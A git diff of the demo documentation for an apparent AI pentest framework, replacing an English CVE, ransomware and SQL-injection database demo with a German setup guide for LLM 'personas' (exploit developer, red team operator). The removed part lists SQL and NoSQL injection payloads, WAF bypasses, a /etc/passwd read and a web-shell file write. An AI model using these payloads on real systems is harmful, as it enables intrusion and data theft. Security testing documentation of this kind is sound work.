@@ -1,283 +1,198 @@
-# Zen AI Pentest - Demo Documentation
+# 🎉 Zen-Ai Kimi Personas - Demo
 
-## CVE & Ransomware Database Demo
+## ✅ System Status: ONLINE
 
-### Screenshot 1: Demo Header
+Alle Komponenten wurden erfolgreich getestet und sind einsatzbereit!
+
 ```
-===============================================================
-           Zen AI Pentest - Database Demo
-                  CVE | Ransomware | SQLi
-===============================================================
-```
-
-### Screenshot 2: CVE Database Search
-
-#### EternalBlue (CVE-2017-0144) Results:
-- **CVE ID:** CVE-2017-0144
-- **Description:** Remote code execution vulnerability in SMBv1
-- **CVSS Score:** 9.8 (Critical)
-- **Affected:** Windows Server 2008, 2012, Windows 7, 8.1, 10
-- **Ransomware Association:** WannaCry, NotPetya, Bad Rabbit
-- **IOCs:** Detected via fileless attack patterns
-- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)
-
-#### WannaCry Ransomware Search:
-- **Type:** Ransomware
-- **Family:** WannaCrypt
-- **Aliases:** WCry, WanaCrypt0r, Wanna Decryptor
-- **First Seen:** 2017-05-12
-- **Attack Vector:** EternalBlue SMB exploit
-- **Kill Switch:** Yes (checks `www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`)
-- **Ransom Demands:** $300-$600 in Bitcoin
-- **File Extensions:** .WNCRY, .WNCRYT, .WCRY
-- **Registry Keys:** `HKCU\Software\WanaCrypt0r`
-- **Damages:** $8 billion (worldwide)
-
-### Screenshot 3: System IOC Scan
-```
-[OK] No ransomware indicators detected
+┌─────────────────────────────────────────────────────────────────┐
+│                    🛡️ SYSTEM STATUS                             │
+├─────────────────────────────────────────────────────────────────┤
+│  API Server        ✅ Running on http://127.0.0.1:5000          │
+│  Web UI            ✅ Available at /                            │
+│  11 Personas       ✅ All loaded                                │
+│  CLI Tool          ✅ Functional                                │
+│  API Client        ✅ Ready                                     │
+└─────────────────────────────────────────────────────────────────┘
 ```
 
-### Screenshot 4: Available Ransomware in Database
-| Family | First Seen | Primary Vector | Damages |
-|--------|-----------|----------------|---------|
-| WannaCry | 2017 | EternalBlue | $8B |
-| Petya | 2016 | CVE-2017-0144 | $1.2B |
-| NotPetya | 2017 | SMB Exploit | $10B |
-| BadRabbit | 2017 | Drive-by Download | $200M |
-| Ryuk | 2018 | TrickBot | $150M+ |
-| Maze | 2019 | RDP/Cobalt Strike | $500M+ |
-| REvil | 2019 | Exploit Kits | $200M+ |
+## 🚀 Schnell-Demo
 
-### Screenshot 5: Top Critical CVEs
-| CVE ID | Score | Description |
-|--------|-------|-------------|
-| CVE-2017-0144 | 9.8 | EternalBlue SMB RCE |
-| CVE-2019-11510 | 10.0 | Pulse VPN RCE |
-| CVE-2019-19781 | 9.8 | Citrix ADC RCE |
-| CVE-2020-1472 | 10.0 | Zerologon Netlogon EoP |
-| CVE-2021-26855 | 9.8 | Exchange Server RCE |
+### 1. CLI Tool (Schnell & Terminal-basiert)
 
----
+```bash
+# Aliase laden
+source ~/Zen-Ai-Pentest/tools/setup_aliases.sh
 
-## SQL Injection Database Demo
+# Personas anzeigen
+khi --list
 
-### Screenshot 6: MySQL Error-Based Payloads
+# Recon Anfrage
+k-recon "Analysiere example.com - Subdomains und Ports"
 
-**Payload Examples:**
-```sql
--- Single Quote Error
-' 
--- Expected: MySQL error message revealing SQL syntax
+# Exploit Development
+k-exploit "Schreibe Python-Scanner für SQL Injection"
 
--- Double Quote Error
-"
--- Expected: MySQL error message
+# Cloud Security
+k-cloud "AWS S3 Bucket Enumeration mit pacu"
 
--- AND 1=1 Detection
-' AND 1=1
--- Expected: Query executes normally
-
--- AND 1=2 Detection  
-' AND 1=2
--- Expected: No results or different page
+# Interaktiver Modus
+k-chat
 ```
 
-### Screenshot 7: MSSQL Time-Based Payloads
+### 2. API Server (Integration & Web UI)
 
-**WAITFOR DELAY:**
-```sql
-'; WAITFOR DELAY '0:0:5'--
--- Description: Time-based with WAITFOR
+```bash
+# Server starten
+kimi-api-start
+# oder
+python3 ~/Zen-Ai-Pentest/api/kimi_personas_api.py --no-auth
+
+# Web UI öffnen: http://127.0.0.1:5000
 ```
 
-### Screenshot 8: WAF Bypass Techniques
+### 3. API Client (Programmatischer Zugriff)
 
-**Original Payload:**
-```sql
-' UNION SELECT password FROM users--
+```bash
+# Health Check
+kapi health
+
+# Personas listen
+kapi list
+
+# Chat mit Kimi API
+kapi chat recon "Analysiere Ziel" --complete
+
+# Interaktiver Modus
+kapi interactive --complete
 ```
 
-**Bypass Variants:**
-1. **Case Variation:** `' UnIoN SeLeCt password FROM users--`
-2. **Comment Injection:** `' /*!50000*/UNION/*!50000*/SELECT/*!50000*/password/*!50000*/FROM/*!50000*/users--`
-3. **Whitespace Substitution:** `'/**/UNION/**/SELECT/**/password/**/FROM/**/users--`
-4. **URL Encoding:** `'%09UNION%09SELECT%09password%09FROM%09users--`
+### 4. cURL (Raw HTTP)
 
-### Screenshot 9: MySQL Injection Cheatsheet
+```bash
+# Health
+curl http://127.0.0.1:5000/api/v1/health
 
-**Comments:**
-```sql
--- -    -- space required after --
-#       -- hash comment
-/* */   -- C-style block comment
+# Alle Personas
+curl http://127.0.0.1:5000/api/v1/personas
+
+# Admin Dashboard
+curl http://127.0.0.1:5000/admin
+
+# Chat
+curl -X POST http://127.0.0.1:5000/api/v1/chat \
+  -H "Content-Type: application/json" \
+  -d '{"persona":"exploit","message":"Test"}'
 ```
 
-**Version Detection:**
-```sql
-SELECT @@version
-SELECT version()
+## 🎭 Die 11 Personas im Überblick
+
+| Emoji | Name | ID | Verwendung |
+|-------|------|----|------------|
+| 🔍 | Recon/OSINT Specialist | `recon` | Subdomain枚举, Port scanning |
+| 💣 | Exploit Developer | `exploit` | Python coding, POC dev |
+| 📝 | Technical Writer | `report` | CVSS scoring, Reports |
+| 🔐 | Code Auditor | `audit` | Security review, OWASP |
+| 🎭 | Social Engineering | `social` | Phishing analysis (Ethics!) |
+| 🌐 | Network Pentester | `network` | AD, Lateral movement |
+| 📱 | Mobile Security | `mobile` | Android, iOS, Frida |
+| 🕵️ | Red Team Operator | `redteam` | APT TTPs, C2 ops |
+| 🧪 | ICS/SCADA Specialist | `ics` | SCADA, Modbus, Safety |
+| ☁️ | Cloud Security Expert | `cloud` | AWS, Azure, K8s |
+| 🔬 | Cryptography Analyst | `crypto` | JWT, TLS, Crypto |
+
+## 📊 Features Demo
+
+### Request Logging
+```bash
+# Logs anzeigen
+tail -f ~/Zen-Ai-Pentest/logs/api_requests.log
+
+# Admin Dashboard
+curl http://127.0.0.1:5000/admin/logs
 ```
 
-**Current User:**
-```sql
-SELECT user()
-SELECT current_user()
-SELECT session_user()
-```
-
-**Database Enumeration:**
-```sql
-SELECT database()
-SELECT schema_name FROM information_schema.schemata
-```
-
-**Table Extraction:**
-```sql
-SELECT table_name FROM information_schema.tables 
-WHERE table_schema = database()
-```
-
-**Column Extraction:**
-```sql
-SELECT column_name FROM information_schema.columns 
-WHERE table_name = 'users'
-```
-
-**Union Injection:**
-```sql
-' UNION SELECT null,null--
-' UNION SELECT null,user()--
-' UNION SELECT user(),version()--
-' UNION SELECT null,load_file('/etc/passwd')--
-```
-
-**File Read:**
-```sql
-SELECT load_file('/etc/passwd')
-SELECT load_file('C:/boot.ini')
-```
-
-**File Write:**
-```sql
-' UNION SELECT 'shell','code' INTO OUTFILE '/var/www/shell.php'--
-```
-
-### Screenshot 10: MongoDB NoSQL Injection
-
-**$ne Operator Bypass:**
+### WebSocket Chat
 ```javascript
-{"username": {"$ne": null}, "password": {"$ne": null}}
+// Browser Console
+const ws = new WebSocket('ws://127.0.0.1:5000/ws/chat');
+ws.onmessage = (e) => console.log(JSON.parse(e.data));
+ws.send(JSON.stringify({
+  persona: 'recon',
+  message: 'Analysiere example.com'
+}));
 ```
 
-**$gt Operator Bypass:**
-```javascript
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
+### Batch Processing
+```bash
+curl -X POST http://127.0.0.1:5000/api/v1/batch \
+  -H "Content-Type: application/json" \
+  -d '{
+    "requests": [
+      {"persona": "recon", "message": "Scan target"},
+      {"persona": "exploit", "message": "Write scanner"},
+      {"persona": "report", "message": "Create report"}
+    ]
+  }'
 ```
 
-**$regex Bypass:**
-```javascript
-{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+## 🔧 Verfügbare Befehle
+
+### CLI (kimi_helper.py)
+```
+khi --list                    # Personas anzeigen
+khi -p <persona> "message"    # One-shot Anfrage
+khi -i                        # Interaktiver Modus
+khi -f file.txt               # Aus Datei lesen
 ```
 
-### Screenshot 11: Database Statistics
+### Aliase
+```
+k-recon, k-exploit, k-report, k-audit
+k-social, k-network, k-mobile, k-redteam
+k-ics, k-cloud, k-crypto
+k-chat                        # Interaktiv
+```
 
-| Database | Count |
-|----------|-------|
-| **CVE Database** | |
-| Total CVEs | 1000+ |
-| Critical CVEs | 50+ |
-| Ransomware Families | 7 |
-| Estimated Total Damage | $20B+ |
-| **SQL Injection Database** | |
-| Total Payloads | 48 |
-| Database Types | 8 |
-| Techniques | 6 |
+### API Client
+```
+kapi health                   # Status prüfen
+kapi list                     # Personas listen
+kapi chat <persona> <msg>     # Chat
+kapi prompt <persona>         # System Prompt anzeigen
+kapi admin                    # Dashboard
+kapi interactive              # Interaktiver Modus
+```
+
+## 🌐 API Endpoints
+
+| Endpoint | Methode | Beschreibung |
+|----------|---------|--------------|
+| `/` | GET | Web UI |
+| `/api/v1/health` | GET | Health Check |
+| `/api/v1/personas` | GET | Alle Personas |
+| `/api/v1/personas/<id>` | GET | Details |
+| `/api/v1/personas/<id>/prompt` | GET | System Prompt |
+| `/api/v1/chat` | POST | Chat |
+| `/api/v1/chat/complete` | POST | Mit Kimi API |
+| `/api/v1/batch` | POST | Batch |
+| `/admin` | GET | Dashboard |
+| `/admin/logs` | GET | Logs |
+| `/ws/chat` | WS | WebSocket |
+
+## 🎉 Fertig!
+
+Dein Zen-Ai Pentest Personas System ist vollständig eingerichtet und einsatzbereit!
+
+### Nächste Schritte:
+1. Wähle deine bevorzugte Schnittstelle (CLI, API, Web UI)
+2. Beginne mit deiner ersten Pentest-Anfrage
+3. Nutze verschiedene Personas für verschiedene Phasen
+
+### Support:
+- Dokumentation: `~/Zen-Ai-Pentest/KIMI_PERSONAS_SETUP.md`
+- API Docs: `~/Zen-Ai-Pentest/api/README.md`
+- Postman: `~/Zen-Ai-Pentest/api/postman_collection.json`
 
 ---
-
-## Multi-Agent System Demo
-
-### Screenshot 12: Agent Collaboration Flow
-
-```
-[ResearchBot] → [AnalysisBot] → [ExploitBot]
-      ↓               ↓              ↓
-   CVE Lookup     Risk Score    Payload Gen
-   IOC Search     Exploit DB    Exploit Test
-```
-
-**Agent Responsibilities:**
-- **ResearchBot:** Gathers threat intelligence, CVE lookup, IOC matching
-- **AnalysisBot:** Risk scoring, exploitability assessment, priority ranking
-- **ExploitBot:** Payload generation, WAF bypass, proof-of-concept creation
-
-### Screenshot 13: Quality Level Routing
-
-| Quality | Provider | Use Case |
-|---------|----------|----------|
-| LOW | DuckDuckGo | Quick answers, documentation |
-| MEDIUM | OpenRouter | Complex analysis, research |
-| HIGH | Direct API | Critical exploits, accuracy required |
-
----
-
-## Nuclei Template Demo
-
-### Screenshot 14: WordPress Templates
-
-| Template | Description |
-|----------|-------------|
-| wp-config-backup.yaml | Finds exposed wp-config backup files |
-| wp-debug-log.yaml | Detects exposed debug.log files |
-| wp-login-brute.yaml | WordPress login brute force |
-| wp-users-api.yaml | Enumerates users via REST API |
-| wp-xmlrpc-pingback.yaml | Detects XML-RPC pingback vulnerability |
-
----
-
-## Complete Demo Output
-
-See [DEMO_OUTPUT_CLEAN.txt](DEMO_OUTPUT_CLEAN.txt) for the complete raw output.
-
-## Running the Demo
-
-```powershell
-# Activate virtual environment
-.\zen_ai_env\Scripts\Activate.ps1
-
-# Run demo
-cd examples
-python cve_and_ransomware_demo.py
-
-# Run multi-agent demo
-python multi_agent_demo.py
-
-# Run backend tests
-python test_backends.py
-```
-
-## Summary
-
-The Zen AI Pentest framework provides:
-
-1. **Comprehensive CVE Database** - 1000+ CVEs with ransomware associations
-2. **SQL Injection Library** - 48+ payloads across 8 database types
-3. **Multi-Agent System** - Collaborative AI agents for research, analysis, and exploitation
-4. **Nuclei Integration** - Pre-built WordPress security templates
-5. **Multi-LLM Support** - DuckDuckGo, OpenRouter, ChatGPT, Claude backends
-6. **Quality-Based Routing** - Automatic provider selection based on query complexity
-
-**Total Database Coverage:**
-- 1000+ CVEs with IOCs and MITRE mappings
-- 48+ SQL injection payloads with WAF bypasses
-- 7 major ransomware families with complete IOCs
-- 5 WordPress security templates
-- 3 collaborative AI agents
-- 4 LLM backends
-
----
-
-*Generated: 2026-01-29*
-*Framework Version: 1.0*
-*Author: SHAdd0WTAka*
+*System bereit für 48h Pentest-Sprints! 🚀*
